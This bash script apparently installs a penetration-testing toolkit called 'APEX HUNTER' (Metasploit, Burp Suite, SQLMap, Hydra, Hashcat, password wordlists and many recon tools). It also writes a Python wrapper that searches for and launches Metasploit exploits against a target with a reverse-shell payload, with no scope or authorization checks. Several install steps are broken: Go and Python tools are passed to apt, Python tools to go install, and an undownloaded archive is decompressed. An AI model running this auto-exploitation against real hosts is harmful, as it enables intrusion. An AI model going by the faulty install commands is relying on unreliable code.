#!/bin/bash
# APEX HUNTER - Advanced Frameworks Installation
# Installs Metasploit, Burp Suite, and other penetration testing frameworks

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}"
cat << "EOF"
🛡️  APEX HUNTER - Advanced Frameworks Installation
================================================
Installing Metasploit, Burp Suite, and penetration testing tools
EOF
echo -e "${NC}"

# Check if running as root
if [[ $EUID -eq 0 ]]; then
   echo -e "${RED}❌ This script should not be run as root${NC}"
   echo -e "${YELLOW}Please run as a regular user with sudo privileges${NC}"
   exit 1
fi

# Function to check command success
check_success() {
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ $1${NC}"
    else
        echo -e "${RED}❌ $1 failed${NC}"
        exit 1
    fi
}

# Function to print step headers
print_step() {
    echo -e "\n${BLUE}🔄 Step $1: $2${NC}"
    echo -e "${BLUE}----------------------------------------${NC}"
}

# Step 1: Install Metasploit Framework
print_step "1" "Installing Metasploit Framework"

echo -e "${CYAN}Adding Metasploit repository...${NC}"
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
sudo ./msfinstall
check_success "Metasploit installation"

# Initialize Metasploit database
echo -e "${CYAN}Initializing Metasploit database...${NC}"
sudo msfdb init
check_success "Metasploit database initialization"

# Step 2: Install Burp Suite Community
print_step "2" "Installing Burp Suite Community"

echo -e "${CYAN}Downloading Burp Suite Community...${NC}"
cd /tmp
wget -O burpsuite_community.sh "https://portswigger.net/burp/releases/download?product=community&type=Linux"
chmod +x burpsuite_community.sh
sudo ./burpsuite_community.sh -q
check_success "Burp Suite installation"

# Step 3: Install OWASP ZAP
print_step "3" "Installing OWASP ZAP"

echo -e "${CYAN}Installing OWASP ZAP...${NC}"
sudo apt install -y zaproxy
check_success "OWASP ZAP installation"

# Step 4: Install Nmap with advanced scripts
print_step "4" "Installing Nmap and NSE Scripts"

echo -e "${CYAN}Installing Nmap...${NC}"
sudo apt install -y nmap nmap-common
check_success "Nmap installation"

# Download additional NSE scripts
echo -e "${CYAN}Downloading additional NSE scripts...${NC}"
cd /usr/share/nmap/scripts
sudo git clone https://github.com/vulnersCom/nmap-vulners.git
sudo git clone https://github.com/scipag/vulscan.git
sudo nmap --script-updatedb
check_success "NSE scripts installation"

# Step 5: Install Nikto
print_step "5" "Installing Nikto Web Scanner"

echo -e "${CYAN}Installing Nikto...${NC}"
sudo apt install -y nikto
check_success "Nikto installation"

# Step 6: Install SQLMap
print_step "6" "Installing SQLMap"

echo -e "${CYAN}Installing SQLMap...${NC}"
sudo apt install -y sqlmap
check_success "SQLMap installation"

# Step 7: Install Gobuster
print_step "7" "Installing Gobuster"

echo -e "${CYAN}Installing Gobuster...${NC}"
sudo apt install -y gobuster
check_success "Gobuster installation"

# Step 8: Install Dirb
print_step "8" "Installing Dirb"

echo -e "${CYAN}Installing Dirb...${NC}"
sudo apt install -y dirb
check_success "Dirb installation"

# Step 9: Install Hydra
print_step "9" "Installing Hydra"

echo -e "${CYAN}Installing Hydra...${NC}"
sudo apt install -y hydra
check_success "Hydra installation"

# Step 10: Install John the Ripper
print_step "10" "Installing John the Ripper"

echo -e "${CYAN}Installing John the Ripper...${NC}"
sudo apt install -y john
check_success "John the Ripper installation"

# Step 11: Install Hashcat
print_step "11" "Installing Hashcat"

echo -e "${CYAN}Installing Hashcat...${NC}"
sudo apt install -y hashcat
check_success "Hashcat installation"

# Step 12: Install Wordlists
print_step "12" "Installing Wordlists"

echo -e "${CYAN}Installing SecLists...${NC}"
cd /opt
sudo git clone https://github.com/danielmiessler/SecLists.git
sudo chown -R $USER:$USER /opt/SecLists
check_success "SecLists installation"

echo -e "${CYAN}Installing RockYou wordlist...${NC}"
sudo mkdir -p /usr/share/wordlists
cd /usr/share/wordlists
sudo wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
sudo gzip -d rockyou.txt.gz 2>/dev/null || true
check_success "RockYou wordlist installation"

# Step 13: Install Additional Tools
print_step "13" "Installing Additional Tools"

echo -e "${CYAN}Installing additional penetration testing tools...${NC}"
sudo apt install -y \
    masscan \
    rustscan \
    feroxbuster \
    ffuf \
    wfuzz \
    amass \
    assetfinder \
    waybackurls \
    gau \
    anew \
    qsreplace \
    unfurl \
    httprobe \
    meg \
    gf \
    anti-burl \
    dalfox \
    kxss \
    freq \
    hakrawler \
    gospider \
    paramspider \
    arjun \
    commix \
    xsser \
    beef-xss
check_success "Additional tools installation"

# Step 14: Install Go-based tools
print_step "14" "Installing Go-based Security Tools"

# Ensure Go is installed
if ! command -v go &> /dev/null; then
    echo -e "${CYAN}Installing Go...${NC}"
    wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
    sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
    echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
    export PATH=$PATH:/usr/local/go/bin
    rm go1.21.5.linux-amd64.tar.gz
fi

echo -e "${CYAN}Installing Go-based tools...${NC}"
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/gf@latest
go install -v github.com/tomnomnom/httprobe@latest
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/tomnomnom/meg@latest
go install -v github.com/tomnomnom/unfurl@latest
go install -v github.com/tomnomnom/anew@latest
go install -v github.com/tomnomnom/qsreplace@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/hahwul/dalfox/v2@latest
go install -v github.com/Emoe/kxss@latest
go install -v github.com/takshal/freq@latest
go install -v github.com/hakluke/hakrawler@latest
go install -v github.com/jaeles-project/gospider@latest
go install -v github.com/devanshbatham/ParamSpider@latest
go install -v github.com/s0md3v/Arjun@latest

# Copy Go binaries to system PATH
sudo cp ~/go/bin/* /usr/local/bin/ 2>/dev/null || true
check_success "Go-based tools installation"

# Step 15: Configure APEX HUNTER integration
print_step "15" "Configuring APEX HUNTER Integration"

echo -e "${CYAN}Creating tool configuration...${NC}"
mkdir -p ~/.config/apex_hunter

cat > ~/.config/apex_hunter/tools.json << EOF
{
    "metasploit": {
        "path": "/usr/bin/msfconsole",
        "database": "/opt/metasploit-framework/embedded/postgresql/data",
        "enabled": true
    },
    "burpsuite": {
        "path": "/usr/local/BurpSuiteCommunity/BurpSuiteCommunity",
        "enabled": true
    },
    "nmap": {
        "path": "/usr/bin/nmap",
        "scripts_path": "/usr/share/nmap/scripts",
        "enabled": true
    },
    "sqlmap": {
        "path": "/usr/bin/sqlmap",
        "enabled": true
    },
    "nikto": {
        "path": "/usr/bin/nikto",
        "enabled": true
    },
    "gobuster": {
        "path": "/usr/bin/gobuster",
        "wordlists": "/opt/SecLists",
        "enabled": true
    },
    "hydra": {
        "path": "/usr/bin/hydra",
        "enabled": true
    },
    "john": {
        "path": "/usr/bin/john",
        "enabled": true
    },
    "hashcat": {
        "path": "/usr/bin/hashcat",
        "enabled": true
    },
    "nuclei": {
        "path": "/usr/local/bin/nuclei",
        "templates": "~/nuclei-templates",
        "enabled": true
    },
    "subfinder": {
        "path": "/usr/local/bin/subfinder",
        "enabled": true
    },
    "httpx": {
        "path": "/usr/local/bin/httpx",
        "enabled": true
    }
}
EOF

check_success "Tool configuration"

# Step 16: Update Nuclei templates
print_step "16" "Updating Nuclei Templates"

echo -e "${CYAN}Updating Nuclei templates...${NC}"
nuclei -update-templates
check_success "Nuclei templates update"

# Step 17: Create APEX HUNTER framework integration
print_step "17" "Creating Framework Integration Scripts"

mkdir -p /usr/local/apexhunter/frameworks

# Metasploit integration script
cat > /usr/local/apexhunter/frameworks/metasploit_integration.py << 'EOF'
#!/usr/bin/env python3
"""
APEX HUNTER - Metasploit Integration
Provides seamless integration with Metasploit Framework
"""

import subprocess
import json
import os
from typing import List, Dict, Any

class MetasploitIntegration:
    def __init__(self):
        self.msfconsole_path = "/usr/bin/msfconsole"
        self.database_connected = False
        
    def connect_database(self):
        """Connect to Metasploit database"""
        try:
            result = subprocess.run([self.msfconsole_path, "-q", "-x", "db_status; exit"], 
                                  capture_output=True, text=True)
            if "Connected" in result.stdout:
                self.database_connected = True
                return True
        except:
            pass
        return False
    
    def search_exploits(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Search for relevant exploits based on target information"""
        exploits = []
        
        # Search by service/port
        if 'services' in target_info:
            for service in target_info['services']:
                cmd = f"search type:exploit {service['name']} {service.get('version', '')}"
                result = self.run_msfconsole_command(cmd)
                exploits.extend(self.parse_search_results(result))
        
        return exploits
    
    def run_exploit(self, exploit_name: str, target: str, options: Dict[str, str] = None) -> Dict[str, Any]:
        """Run specific exploit against target"""
        commands = [
            f"use {exploit_name}",
            f"set RHOSTS {target}",
            "set PAYLOAD generic/shell_reverse_tcp",
            f"set LHOST {self.get_local_ip()}",
            "set LPORT 4444"
        ]
        
        if options:
            for key, value in options.items():
                commands.append(f"set {key} {value}")
        
        commands.extend(["exploit", "exit"])
        
        result = self.run_msfconsole_command("; ".join(commands))
        return self.parse_exploit_results(result)
    
    def run_msfconsole_command(self, command: str) -> str:
        """Run command in msfconsole"""
        try:
            result = subprocess.run([self.msfconsole_path, "-q", "-x", f"{command}; exit"], 
                                  capture_output=True, text=True, timeout=300)
            return result.stdout
        except:
            return ""
    
    def get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            result = subprocess.run(["hostname", "-I"], capture_output=True, text=True)
            return result.stdout.strip().split()[0]
        except:
            return "127.0.0.1"
    
    def parse_search_results(self, output: str) -> List[Dict[str, Any]]:
        """Parse Metasploit search results"""
        exploits = []
        lines = output.split('\n')
        
        for line in lines:
            if 'exploit/' in line and 'normal' in line:
                parts = line.split()
                if len(parts) >= 3:
                    exploits.append({
                        'name': parts[0],
                        'disclosure_date': parts[1] if len(parts) > 1 else '',
                        'rank': parts[2] if len(parts) > 2 else '',
                        'description': ' '.join(parts[3:]) if len(parts) > 3 else ''
                    })
        
        return exploits
    
    def parse_exploit_results(self, output: str) -> Dict[str, Any]:
        """Parse exploit execution results"""
        return {
            'success': 'session' in output.lower() or 'shell' in output.lower(),
            'output': output,
            'sessions': self.extract_sessions(output)
        }
    
    def extract_sessions(self, output: str) -> List[str]:
        """Extract session information from output"""
        sessions = []
        lines = output.split('\n')
        
        for line in lines:
            if 'session' in line.lower() and 'opened' in line.lower():
                sessions.append(line.strip())
        
        return sessions

if __name__ == "__main__":
    # Test integration
    msf = MetasploitIntegration()
    if msf.connect_database():
        print("✅ Metasploit integration ready")
    else:
        print("❌ Metasploit database not connected")
EOF

chmod +x /usr/local/apexhunter/frameworks/metasploit_integration.py

check_success "Framework integration scripts"

# Final step: Cleanup and summary
print_step "18" "Cleanup and Summary"

echo -e "${CYAN}Cleaning up temporary files...${NC}"
rm -f /tmp/burpsuite_community.sh
rm -f msfinstall

echo -e "\n${GREEN}🎉 APEX HUNTER Frameworks Installation Complete!${NC}"
echo -e "${GREEN}================================================${NC}"
echo -e "${CYAN}Installed Frameworks:${NC}"
echo -e "  ✅ Metasploit Framework"
echo -e "  ✅ Burp Suite Community"
echo -e "  ✅ OWASP ZAP"
echo -e "  ✅ Nmap with NSE scripts"
echo -e "  ✅ SQLMap"
echo -e "  ✅ Nikto"
echo -e "  ✅ Gobuster"
echo -e "  ✅ Hydra"
echo -e "  ✅ John the Ripper"
echo -e "  ✅ Hashcat"
echo -e "  ✅ Nuclei"
echo -e "  ✅ 50+ additional tools"
echo -e "\n${CYAN}Wordlists installed:${NC}"
echo -e "  ✅ SecLists (/opt/SecLists)"
echo -e "  ✅ RockYou (/usr/share/wordlists/rockyou.txt)"
echo -e "\n${CYAN}Integration:${NC}"
echo -e "  ✅ APEX HUNTER framework integration"
echo -e "  ✅ Tool configuration files"
echo -e "  ✅ Metasploit database initialized"
echo -e "\n${YELLOW}Next steps:${NC}"
echo -e "  1. Run: source ~/.bashrc"
echo -e "  2. Test: msfconsole"
echo -e "  3. Start APEX HUNTER: python apex_hunter.py --web"
echo -e "\n${GREEN}Ready for advanced penetration testing! 🚀${NC}"